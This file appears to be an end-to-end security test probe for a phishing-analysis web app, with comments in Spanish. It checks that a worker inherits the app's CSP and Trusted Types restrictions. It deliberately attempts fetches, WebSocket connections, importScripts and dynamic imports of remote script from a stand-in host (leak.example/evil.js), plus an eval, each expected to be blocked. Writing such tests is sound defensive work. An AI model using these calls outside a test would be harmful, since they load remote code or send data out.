// Sonda para tests/e2e/worker.e2e.js (ADR 0007): desde dentro de un module worker blob: creado como lo hace
// src/ui/analysis-worker.js se intenta todo lo que la CSP del documento prohíbe. Si el worker hereda la CSP, cada
// intento falla y el worker lo cuenta en `securitypolicyviolation`. El resultado se deja en window.__probe.
// Esta página es una PRUEBA: contiene a propósito un eval y conexiones a un dominio inventado (leak.example).
import { createAnalyzer, workerSource, POLICY_NAME } from '../../../src/ui/analysis-worker.js';

const out = { steps: [] };
window.__probePartial = out; // lo que haya hasta el momento, por si algo se cuelga
const log = (k, v) => { out[k] = v; out.steps.push(`${k}: ${JSON.stringify(v)}`); document.getElementById('out').textContent = out.steps.join('\n'); };

const engineUrl = new URL('../../../src/core/engine.js', import.meta.url).href;
const remote = 'https://leak.example/evil.js';
const attempts = `
const r = { violations: [] };
self.addEventListener('securitypolicyviolation', (e) => { r.violations.push(e.violatedDirective + ' ' + e.blockedURI); });
const withTimeout = (p, ms) => Promise.race([p, new Promise((_, ko) => setTimeout(() => ko(new Error('timeout')), ms))]);
const attempt = async (name, fn) => { try { await withTimeout(fn(), 1500); r[name] = 'PASÓ'; } catch (e) { r[name] = 'bloqueado: ' + (e?.name === 'Error' ? e.message : (e?.name ?? e)); } };
self.onmessage = async (e) => {
  const origin = e.data.origin;
  let analyzeInput = null;
  try { ({ analyzeInput } = await import(${JSON.stringify(engineUrl)})); r.engineLoaded = true; } catch (err) { r.engineLoaded = String(err); }
  await attempt('fetchSameOrigin', () => fetch(origin + '/index.html'));
  await attempt('fetchRemote', () => fetch('https://leak.example/x'));
  await attempt('importRemote', () => import(${JSON.stringify(remote)}));
  await attempt('xhr', () => new Promise((ok, ko) => { const x = new XMLHttpRequest(); x.onload = ok; x.onerror = () => ko(new Error('xhr error')); x.open('GET', origin + '/index.html'); x.send(); }));
  await attempt('websocket', () => new Promise((ok, ko) => { const w = new WebSocket('wss://leak.example/'); w.onopen = ok; w.onerror = () => ko(new Error('ws error')); }));
  await attempt('evalInWorker', async () => { eval('1+1'); });
  await attempt('importScripts', async () => { importScripts(${JSON.stringify(remote)}); });
  r.engineScore = analyzeInput ? analyzeInput({ kind: 'text', value: 'Verifica tu cuenta urgentemente: http://203.0.113.9/login' }).score : null;
  await new Promise((d) => setTimeout(d, 100));
  postMessage(r);
};
`;

async function main() {
  const hasTT = typeof trustedTypes !== 'undefined' && Boolean(trustedTypes.createPolicy);
  log('trustedTypes', hasTT);
  const url = URL.createObjectURL(new Blob([attempts], { type: 'text/javascript' }));
  // 1. Con Trusted Types, una cadena suelta no vale para new Worker.
  try {
    new Worker(url, { type: 'module' }).terminate();
    log('workerWithoutPolicy', 'CREADO');
  } catch (e) {
    log('workerWithoutPolicy', `rechazado: ${e.name}`);
  }
  // 2. La política con el nombre permitido, con la misma regla que la app.
  let policy = null;
  try {
    policy = hasTT ? trustedTypes.createPolicy(POLICY_NAME, { createScriptURL: (s) => (s.startsWith(`blob:${location.origin}/`) ? s : (() => { throw new TypeError('solo blob: propio'); })()) }) : null;
    log('policyCreated', Boolean(policy));
  } catch (e) {
    log('policyCreated', `error: ${e.name}`);
  }
  // 3. Otro nombre no está en la lista de la CSP.
  try {
    if (hasTT) trustedTypes.createPolicy('otra', { createScriptURL: (s) => s });
    log('otherPolicy', hasTT ? 'CREADA' : 'sin Trusted Types');
  } catch (e) {
    log('otherPolicy', `rechazada: ${e.name}`);
  }
  // 4. Y el mismo nombre otra vez tampoco (sin 'allow-duplicates').
  try {
    if (hasTT) trustedTypes.createPolicy(POLICY_NAME, { createScriptURL: (s) => s });
    log('duplicatePolicy', hasTT ? 'CREADA' : 'sin Trusted Types');
  } catch (e) {
    log('duplicatePolicy', `rechazada: ${e.name}`);
  }
  // 5. Un script remoto no pasa por la política.
  try {
    policy?.createScriptURL(remote);
    log('policyRemote', policy ? 'ACEPTADO' : 'sin política');
  } catch (e) {
    log('policyRemote', `rechazado: ${e.name}`);
  }
  // 6. El worker con los intentos.
  try {
    const worker = new Worker(policy ? policy.createScriptURL(url) : url, { type: 'module' });
    const result = await new Promise((ok, ko) => {
      worker.onmessage = (e) => ok(e.data);
      worker.onerror = (e) => ko(new Error(`${e.message} @${e.filename}:${e.lineno}`));
      setTimeout(() => ko(new Error('timeout del worker')), 15000);
      worker.postMessage({ origin: location.origin });
    });
    log('worker', result);
    worker.terminate();
  } catch (e) {
    log('worker', `error: ${e.message}`);
  }
  URL.revokeObjectURL(url);
  // 7. El mismo import remoto desde el documento, para comparar: si Playwright también ve esa petición, es que
  // el navegador la crea y la corta por CSP antes de salir, no una fuga del worker.
  try {
    await import('https://leak.example/from-document.js');
    log('documentImportRemote', 'PASÓ');
  } catch (e) {
    log('documentImportRemote', `bloqueado: ${e.name}`);
  }
  // 8. El analizador de la app, tal cual, con la fuente real del worker.
  // (La política phishlens-worker ya existe en esta página: el analizador no puede crear la suya y cae al hilo
  // principal; por eso se comprueba aparte, en una página limpia, desde el e2e. Aquí solo se valida la fuente.)
  log('appWorkerSourceHasNoEval', !/\beval\(|importScripts|fetch\(/.test(workerSource(engineUrl)));
  log('analyzerExported', typeof createAnalyzer === 'function');
  log('done', true);
  window.__probe = out;
}
main();
